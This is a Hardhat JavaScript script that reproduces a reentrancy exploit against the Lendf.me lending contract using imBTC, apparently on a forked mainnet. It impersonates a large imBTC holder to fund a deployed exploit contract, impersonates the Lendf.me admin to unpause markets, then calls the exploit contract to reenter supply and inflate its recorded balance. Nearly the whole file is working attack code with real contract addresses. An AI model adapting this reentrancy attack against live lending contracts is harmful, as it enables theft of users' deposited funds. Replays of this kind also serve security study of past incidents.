// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
const hre = require("hardhat");
const lendfmeABI = require("./abi/lendfme.json");
const imBTCABI = require("./abi/imbtc.json");
const exploitABI = require("./abi/exploit.json");

async function main() {
  // Define atttacker address
  const attacker = (await hre.ethers.getSigners())[1];
  // Token contract address of imBTC
  const imBTCAddress = "0x3212b29E33587A00FB1C83346f5dBFA69A458923";
  // Address of contract used by attacker for reentrancy
  const exploitContractAddress = "0x82EdA215Fa92B45a3a76837C65Ab862b6C7564a8";
  // Address of vulnerable contract
  const lendfmeAddress = "0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea";

  // Init contracts
  const imBTCContract = await hre.ethers.getContractAt(imBTCABI, imBTCAddress);
  const lendfmeContract = await hre.ethers.getContractAt(
    lendfmeABI,
    lendfmeAddress
  );
  const exploitContract = await hre.ethers.getContractAt(
    exploitABI,
    exploitContractAddress
  );

  await fetchBTC(imBTCContract, exploitContractAddress);
  await prepareContract(lendfmeContract);
  await attack(exploitContract, attacker);

  console.log(
    "Exploiter BTC holdings",
    await imBTCContract.connect(attacker).balanceOf(exploitContractAddress)
  );
  console.log(
    "Lendf.me contract supply:",
    await lendfmeContract
      .connect(attacker)
      .getSupplyBalance(exploitContractAddress, imBTCAddress)
  );
}

// In order for the attack to function we need imBTC,
// we retrieve this from a top holder.
async function fetchBTC(imBTCContract, exploitContractAddress) {
  // Address of large imBTC holder
  const imBTCHolderAddress = "0xfea4224da399f672eb21a9f3f7324cef1d7a965c";

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [imBTCHolderAddress],
  });

  const imBTCHolder = ethers.provider.getSigner(imBTCHolderAddress);

  // 100000000 = 1 imBTC token
  await imBTCContract
    .connect(imBTCHolder)
    .transfer(exploitContractAddress, 500000000);

  await hre.network.provider.request({
    method: "hardhat_stopImpersonatingAccount",
    params: [imBTCHolderAddress],
  });
}

// We need to bring the contract to a functional state in order to execute the attack
async function prepareContract(lendfmeContract) {
  // Address which has admin access to Lendfme smart contracts
  const lendfmeAdminAddress = "0xA6a6783828Ab3E4A9dB54302bC01c4ca73f17EFB";

  const isPaused = await lendfmeContract.paused();
  // If the markets are active we do not have to change the state
  if (!isPaused) {
    return;
  }

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [lendfmeAdminAddress],
  });

  const lendfmeAdmin = ethers.provider.getSigner(lendfmeAdminAddress);

  await lendfmeContract.connect(lendfmeAdmin)._setPaused(false);

  await hre.network.provider.request({
    method: "hardhat_stopImpersonatingAccount",
    params: [lendfmeAdminAddress],
  });
}

async function attack(exploitContract, attacker) {
  await exploitContract.connect(attacker).supply(400000000);
  await exploitContract.connect(attacker).toggleActive();
  await exploitContract.connect(attacker).supply(100000000);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
